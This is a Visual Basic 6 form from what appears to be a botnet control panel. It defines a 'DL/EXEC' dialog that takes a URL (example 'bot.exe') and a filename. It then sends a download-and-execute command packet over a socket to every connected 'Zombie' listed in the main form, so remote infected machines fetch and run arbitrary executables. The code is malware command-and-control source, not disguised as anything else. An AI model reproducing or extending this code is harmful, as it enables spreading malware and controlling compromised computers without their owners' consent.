VERSION 5.00
Begin VB.Form Form4 
   BackColor       =   &H000000C0&
   BorderStyle     =   0  'None
   ClientHeight    =   1965
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3930
   ControlBox      =   0   'False
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1965
   ScaleWidth      =   3930
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   4
      Top             =   1200
      Width           =   3375
   End
   Begin VB.CommandButton Command1 
      Caption         =   "DL/EXEC"
      Height          =   315
      Left            =   2640
      TabIndex        =   1
      Top             =   1560
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   240
      TabIndex        =   0
      Top             =   480
      Width           =   3495
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Run/Copy As: (Example: File.exe"
      Height          =   255
      Left            =   720
      TabIndex        =   3
      Top             =   960
      Width           =   2895
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "URL: („À«·: http://www.example.com/bot.exe"
      Height          =   255
      Left            =   240
      TabIndex        =   2
      Top             =   240
      Width           =   3735
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim data(1 To 600) As String
Dim sent As Integer
Dim checkeditem As Integer
Dim f As Integer
Option Explicit
Private Declare Function GetCursorPos Lib "User32" (lpPoint As POINTAPI) As Long

Private Type POINTAPI
 X As Long
 Y As Long
End Type

Private Sub Form_Load()
Dim NewPos As POINTAPI

Call GetCursorPos(NewPos)

 Me.Left = (NewPos.X * 15) + 100
 Me.Top = (NewPos.Y * 15) + 100

End Sub

Private Sub text1_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        Command1_Click
    End If
    If KeyAscii = 27 Then
    Unload Me
    End If
End Sub
Private Sub Command1_Click()
Dim f As Integer
Dim pckt$
sent = 0
For f = 1 To Form1.ListView1.ListItems.Count
pckt$ = "FUCKYOU" & "3" & Text1.text & "5" & "6" & Text2.text & "0"
Form1.Zombies(f).SendData pckt$
sent = sent + 1
Form1.ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"
Unload Me
DoEvents
Next f
End Sub
Private Sub text2_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then
        Command1_Click
    End If
End Sub

